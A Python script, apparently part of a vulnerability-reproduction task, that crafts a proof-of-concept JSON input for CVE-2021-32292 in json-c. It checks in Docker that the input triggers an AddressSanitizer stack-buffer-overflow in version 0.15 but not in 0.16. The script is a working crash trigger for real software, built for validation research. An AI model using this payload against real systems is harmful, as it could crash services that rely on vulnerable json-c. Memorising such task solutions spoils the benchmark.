import subprocess
import os
import sys

def generate_poc():
    """Generate the working PoC for CVE-2021-32292"""
    print("[*] Generating PoC for CVE-2021-32292...")
    
    prefix = b'{"a":"'
    null_position = 32767
    
    padding_before = null_position - len(prefix)
    padding_after = 32767 - null_position
    
    first_chunk = prefix + (b'A' * padding_before) + b'\x00' + (b'X' * padding_after)
    second_chunk = b'BBBB'
    
    payload = first_chunk + second_chunk
    
    with open("manual_seed.json", "wb") as f:
        f.write(payload)
    
    print(f"    Created PoC: {len(payload)} bytes")
    print(f"    NULL byte at position: {null_position}")
    
    return payload

def run_validation():
    """Run the validation on both versions"""
    
    cmd_base = [
        "docker", "compose", 
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "run", "--rm",
        "-v", f"{os.getcwd()}/manual_seed.json:/input/seed.bin"
    ]
    
    print("\n[*] Testing vulnerable version (json-c 0.15)...")
    result_vuln = subprocess.run(
        cmd_base + ["target-vuln", "/usr/local/bin/json_parse", "/input/seed.bin"],
        capture_output=True, text=True
    )
    
    vuln_has_overflow = "AddressSanitizer" in result_vuln.stderr and "buffer-overflow" in result_vuln.stderr
    
    print(f"    Exit code: {result_vuln.returncode}")
    print(f"    ASan detected overflow: {'YES ✓' if vuln_has_overflow else 'NO ✗'}")
    
    print("\n[*] Testing fixed version (json-c 0.16)...")
    result_fixed = subprocess.run(
        cmd_base + ["target-fixed", "/usr/local/bin/json_parse", "/input/seed.bin"],
        capture_output=True, text=True
    )
    
    fixed_has_overflow = "AddressSanitizer" in result_fixed.stderr and "buffer-overflow" in result_fixed.stderr
    fixed_handles_error = "Failed at offset" in result_fixed.stderr
    
    print(f"    Exit code: {result_fixed.returncode}")
    print(f"    Handles error safely: {'YES ✓' if fixed_handles_error and not fixed_has_overflow else 'NO ✗'}")
    
    print("\n=== RESULTS ===")
    
    if vuln_has_overflow and not fixed_has_overflow:
        print("✅ SUCCESS! CVE-2021-32292 validated.")
        print("   Vulnerable version exhibits stack-buffer-overflow")
        print("   Fixed version handles the error safely")
        return True
    else:
        print("❌ FAIL: Validation unsuccessful")
        return False

def main():
    generate_poc()
    success = run_validation()
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()